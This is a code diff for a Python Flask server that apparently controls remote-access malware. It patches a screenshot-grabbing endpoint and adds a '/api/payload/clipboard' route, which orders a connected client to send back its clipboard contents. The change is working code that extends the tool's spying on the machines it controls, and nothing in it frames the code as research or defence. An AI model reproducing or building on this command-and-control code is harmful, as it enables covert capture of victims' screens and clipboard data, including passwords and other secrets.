@@ -52,9 +52,26 @@ def ss_payload():
 	if client:
 		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
 		if client_sock:
-			common.send_msg(client_sock, "screenshot")
+			common.send_msg(client_sock, "screenshot".encode())
 			image = common.recv_msg(client_sock)
-			return image, 200
+			return image.decode(), 200
+		else:
+			return "Error", 500
+	else:
+		return "Missing params", 400
+
+
+@api_routes.route('/api/payload/clipboard', methods=['POST'])
+def clipboard_payload():
+	data = json.loads(flask.request.data.decode())
+	client = data["client"]
+
+	if client:
+		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
+		if client_sock:
+			common.send_msg(client_sock, "clipboard".encode())
+			clipboard = common.recv_msg(client_sock)
+			return clipboard.decode(), 200
 		else:
 			return "Error", 500
 	else:
